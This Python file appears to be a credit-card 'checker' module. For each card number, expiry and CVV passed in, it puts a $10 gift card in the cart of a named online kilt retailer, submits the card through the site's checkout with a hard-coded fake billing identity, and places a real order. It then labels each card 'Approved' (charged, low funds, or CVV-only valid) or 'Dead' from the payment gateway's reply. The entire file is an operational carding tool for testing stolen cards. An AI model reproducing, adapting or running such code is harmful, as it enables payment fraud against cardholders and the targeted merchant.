from utilsdf.functions import capture
from httpx import AsyncClient


async def devilsx(cc, month, year, cvv):
    async with AsyncClient(
        follow_redirects=True,
        verify=False,
    ) as session:
        head = {
            "Host": "www.usakilts.com",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        }

        r = await session.get(
            "https://www.usakilts.com/celtic-gifts-homegoods/gift-certificate/gift-card.html",
            headers=head,
        )
        ch = capture(r.text, '"https://www.usakilts.com/checkout/cart/add/', '"')

        head2 = {
            "Host": "www.usakilts.com",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "accept": "application/json, text/javascript, */*; q=0.01",
            "origin": "https://www.usakilts.com",
            "referer": "https://www.usakilts.com/celtic-gifts-homegoods/gift-certificate/gift-card.html",
        }

        post2 = "product=23195&aw_gc_custom_amount=10&aw_gc_sender_name=Sachio+YT&aw_gc_sender_email=sachiopremiun%40gmail.com&aw_gc_recipient_name=Sachio+YT&aw_gc_recipient_email=sachiopremiun%40gmail.com&aw_gc_message=&qty=1&isAjax=1"

        r2 = await session.post(
            f"https://www.usakilts.com/ajax/index/add/{ch}",
            headers=head2,
            data=post2,
        )

        head3 = {
            "Host": "www.usakilts.com",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "accept": "text/javascript, text/html, application/xml, text/xml, */*",
            "origin": "https://www.usakilts.com",
            "referer": "https://www.usakilts.com/onestepcheckout/index/",
        }

        if cc.startswith("3"):
            typec = "AE"
        elif cc.startswith("4"):
            typec = "VI"
        elif cc.startswith("5"):
            typec = "MC"
        elif cc.startswith("6"):
            typec = "DI"

        post3 = f"payment%5Bmethod%5D=usaepay&payment%5Bcc_owner%5D=Sachio%20YT&payment%5Bcc_type%5D={typec}&payment%5Bcc_number%5D={cc}&payment%5Bcc_exp_month%5D={month}&payment%5Bcc_exp_year%5D={year}&payment%5Bcc_cid%5D={cvv}"

        r3 = await session.post(
            "https://www.usakilts.com/onestepcheckout/ajax/savePaymentMethod/",
            headers=head3,
            data=post3,
        )

        post4 = f"billing%5Bfirstname%5D=Sachio&billing%5Blastname%5D=YT&billing%5Bemail%5D=sachiopremiun%40gmail.com&billing%5Bcustomer_password%5D=&billing%5Bconfirm_password%5D=&billing%5Bstreet%5D%5B%5D=118%20W%20132nd%20St&billing%5Bstreet%5D%5B%5D=&billing%5Bcountry_id%5D=US&billing%5Bcity%5D=New%20York&billing%5Bregion_id%5D=43&billing%5Bregion%5D=&billing%5Bpostcode%5D=10027&billing%5Btelephone%5D=19006318646&billing%5Bfax%5D=&billing%5Bcompany%5D=YT&billing%5Bsave_in_address_book%5D=1&billing%5Buse_for_shipping%5D=1&shipping%5Bfirstname%5D=&shipping%5Blastname%5D=&shipping%5Bstreet%5D%5B%5D=&shipping%5Bstreet%5D%5B%5D=&shipping%5Bcountry_id%5D=US&shipping%5Bcity%5D=&shipping%5Bregion_id%5D=&shipping%5Bregion%5D=&shipping%5Bpostcode%5D=&shipping%5Btelephone%5D=&shipping%5Bfax%5D=&shipping%5Bcompany%5D=&shipping%5Bsave_in_address_book%5D=1&comments=&payment%5Bmethod%5D=usaepay&payment%5Bcc_owner%5D=Sachio%20YT&payment%5Bcc_type%5D={typec}&payment%5Bcc_number%5D={cc}&payment%5Bcc_exp_month%5D={month}&payment%5Bcc_exp_year%5D={year}&payment%5Bcc_cid%5D={cvv}&coupon_code=&aw_giftcard_code="

        r4 = await session.post(
            "https://www.usakilts.com/onestepcheckout/ajax/placeOrder/",
            headers=head3,
            data=post4,
        )
        su = capture(r4.text, '"success":', ",")
        msg = capture(
            r4.text,
            '"messages":["There was an error processing your order. Please contact us or try again later.","',
            '"',
        )

        if su == "true":
            status = "Approved! ✅ -» charged!"
            msg = f"Thank You! -» $10"
        elif (
            msg
            == "Payment authorization transaction has been declined:  Insufficient funds"
        ):
            status = "Approved! ✅ -» low funds"
        elif (
            msg
            == "Payment authorization transaction has been declined:  Invalid CVV value"
        ):
            status = "Approved! ✅ -» ccn"
        else:
            status = "Dead! ❌"

        return status, msg
